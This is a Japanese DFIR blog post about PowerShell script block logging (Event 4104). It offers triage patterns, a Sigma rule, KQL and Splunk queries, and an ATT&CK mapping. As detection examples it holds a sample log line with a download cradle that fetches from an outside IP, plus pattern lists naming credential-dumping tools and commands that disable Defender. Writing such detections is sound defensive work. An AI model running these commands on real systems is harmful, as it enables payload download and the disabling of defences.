---
title: "PowerShell Event ID 4104 を解読する:DFIR のためのスクリプトブロック ロギング"
description: "スクリプトブロック ロギングは Windows で最も有用な無料の防御コントロール。難読化されたものやインメモリのものも含め、スクリプト本体全体をイベント 4104 として記録する。"
date: "2026-05-17"
---

PowerShell のスクリプトブロック ロギングが有効なとき、エンジンは実行されるすべてのスクリプトの本体を記録します — 対話的コマンド、ディスクから読み込まれたスクリプト、そして `Invoke-Expression` や `IEX` でメモリにリフレクトされたあらゆるもの。レコードは `Microsoft-Windows-PowerShell/Operational` [チャネル](/ja/blog/what-is-an-evtx-file) にイベント ID **4104**「Creating Scriptblock text」として着地します。

## 得られる情報

```xml
<Data Name="MessageNumber">1</Data>
<Data Name="MessageTotal">1</Data>
<Data Name="ScriptBlockText">$wc = New-Object Net.WebClient; $wc.DownloadString('http://203.0.113.5/a')</Data>
<Data Name="ScriptBlockId">{guid}</Data>
<Data Name="Path">C:\Users\alice\Downloads\setup.ps1</Data>
```

長いスクリプトの場合、PowerShell は複数の 4104 レコード（メッセージ番号ごとに 1 つ）に分割します。それらをつなぎ直すのが必須です — フラグメントは誤読しやすいからです。

## 有効化の方法

設定は `HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging = 1`、グループ ポリシーでは*コンピュータの構成 → 管理用テンプレート → Windows コンポーネント → Windows PowerShell → PowerShell スクリプト ブロック ログを有効にする*に等価です。PowerShell 側で測定するに値するコストはありません — どこでもオンにしてください。

## 他では捕捉できないものを捕捉する

PowerShell エンジンは、あらゆるエンコーディング、圧縮、インメモリ リフレクションの**後**でスクリプトをログします。つまり:

- `-EncodedCommand` 呼び出しは、エンコード済みランチャ（対応する ProcessCreate / 4688 に）とデコード済み本体（4104 に）の両方をログします。
- リモート ペイロードをダウンロードして `Invoke-Expression` するスクリプトは、ラッパではなく*実行された*本体をログします。
- AMSI バイパスを使う攻撃者でも 4104 レコードは残ります — バイパスはスキャンに影響しますがロギングには影響しません。

これがプラットフォーム上で最も有用な無料の防御コントロールです。EDR を持たないディフェンダーでも、これは普通持っています。

## 4104 をスケールでトリアージ

4104 レコードのコーパスにおける高シグナル パターン。

- `DownloadString`、`DownloadFile`、`Invoke-WebRequest`、`Net.WebClient` — リモート コンテンツ取得。
- `IEX`、`Invoke-Expression` — 動的実行。
- `FromBase64String`、`[System.Convert]::FromBase64String` — エンコード済みペイロード。
- `Add-MpPreference -ExclusionPath` — Defender 改ざん。
- `Set-MpPreference -DisableRealtimeMonitoring` — Defender 改ざん。
- `[System.Reflection.Assembly]::Load`、`[Reflection.Emit]` — インメモリ アセンブリ読み込み。
- `Invoke-Mimikatz`、`Invoke-Kerberoast`、`Invoke-BloodHound` — 既知の攻撃用ツール。

単一のマッチが必ずしも悪意とは限りません（管理者も `DownloadString` を使う）が、組み合わせはそうです。4104 から対応する [Sysmon イベント 1](/ja/blog/sysmon-event-id-1-process-create) / 4688 へタイムスタンプ + プロセスでピボットして、完全な呼び出し文脈を復元してください。

## サンプル Sigma ルール — 攻撃用 PowerShell ツールのスクリプトブロック

```yaml
title: Suspicious PowerShell Scriptblock — Offensive Tool Indicators
id: 4f1a3b8d-2c5e-4d8f-9a3b-1c2d3e4f5a6b
status: stable
description: PowerShell scriptblock body contains strings characteristic of offensive tooling, encoded payloads, or in-memory reflection.
references:
  - https://attack.mitre.org/techniques/T1059/001/
  - https://attack.mitre.org/techniques/T1027/
logsource:
  product: windows
  service: powershell
  category: ps_script
detection:
  selection_offensive:
    EventID: 4104
    ScriptBlockText|contains:
      - 'Invoke-Mimikatz'
      - 'Invoke-Kerberoast'
      - 'Invoke-BloodHound'
      - 'Invoke-DCSync'
      - 'New-PSInjection'
      - 'Get-PassHashes'
  selection_reflective:
    EventID: 4104
    ScriptBlockText|contains:
      - 'System.Reflection.Assembly]::Load'
      - '[Reflection.Emit]'
      - 'FromBase64String'
  selection_defender_tamper:
    EventID: 4104
    ScriptBlockText|contains:
      - 'Set-MpPreference -DisableRealtimeMonitoring'
      - 'Add-MpPreference -ExclusionPath'
      - 'Set-MpPreference -DisableIOAVProtection'
  condition: selection_offensive or selection_reflective or selection_defender_tamper
falsepositives:
  - Defenders running known offensive tooling for testing (whitelist by host)
  - Software installers using reflection for legitimate purposes
level: high
tags:
  - attack.execution
  - attack.t1059.001
  - attack.defense_evasion
```

## サンプル KQL — 低特権ユーザーからのエンコード済み PowerShell

```kusto
let encoded =
    Event
    | where Source == "Microsoft-Windows-PowerShell" and EventID == 4104
    | extend XmlData = parse_xml(EventData)
    | extend ScriptBlockText = tostring(XmlData.EventData.Data[2])
    | where ScriptBlockText contains "FromBase64String"
       or ScriptBlockText matches regex @"\b-e(?:nc|ncodedcommand)?\b\s"
    | project TimeGenerated, Computer, UserId=tostring(XmlData.System.Security["@UserID"]), ScriptBlockText;
encoded
| where UserId !startswith "S-1-5-18"   // exclude LocalSystem
   and UserId !startswith "S-1-5-19"
   and UserId !startswith "S-1-5-20"
| order by TimeGenerated desc
```

## サンプル Splunk — PowerShell からの Defender 改ざん

```spl
index=powershell EventCode=4104
   ( ScriptBlockText="*Set-MpPreference*DisableRealtimeMonitoring*"
     OR ScriptBlockText="*Add-MpPreference*ExclusionPath*"
     OR ScriptBlockText="*Set-MpPreference*DisableIOAVProtection*" )
| table _time host UserID ScriptBlockText
```

## ATT&CK マッピング

- **T1059.001 — Command and Scripting Interpreter: PowerShell**:攻撃的な 4104 はすべてここにマップ。PowerShell は近年の侵入で最も引用される実行技法の 1 つ。
- **T1027 — Obfuscated Files or Information**:エンコード / Base64 / `FromBase64String` パターン。
- **T1059.001 + T1140 — Deobfuscate/Decode Files or Information**:エンジンが*デコード済み*の形をログする — これが [4688](/ja/blog/event-id-4688-process-creation) に対して 4104 が提供する価値。
- **T1562.001 — Impair Defenses: Disable or Modify Tools**:`Set-MpPreference -DisableRealtimeMonitoring`、`Add-MpPreference -ExclusionPath`。
- **T1003.001 — OS Credential Dumping: LSASS Memory**:スクリプト本体内の `Invoke-Mimikatz`、`MiniDump`、`comsvcs.dll` パターン。
- **T1558.003 — Kerberoasting**:`Invoke-Kerberoast`、`Rubeus kerberoast` パターン。

## 攻撃そっくりの誤検知

- **管理者ランブック**は時にテンプレート化された設定のために `Invoke-Expression` を正当に使用。組み合わせは通常短く、反復可能で、既知の管理者セッションから。
- **Defender 管理**スクリプト（社内 IT）は除外リストをプッシュするため正当に `Set-MpPreference` を呼びます。スクリプトの署名証明書またはホスト SID でホワイトリスト化。
- **Chocolatey / WinGet / パッケージ インストーラ**は Base64 エンコード済み PowerShell を正当に使用。パターン:短い、日中、ビルド / 管理ホストから。
- **レッドチーム / ペンテスト**活動は実際の攻撃と全く同じに見えます。エンゲージメント ウィンドウを調整し、オペレータの送信元 IP にタグ付け。

## 盲点

4104 は*スクリプト*本体をログします。文単位の実行、関数の戻り値、変数値はログしません。それにはトランスクリプション（イベント 4103、「Module logging」）または本物の EDR が必要です。4104 は何が動いたかを伝え、残りは何をしたかを伝えます。
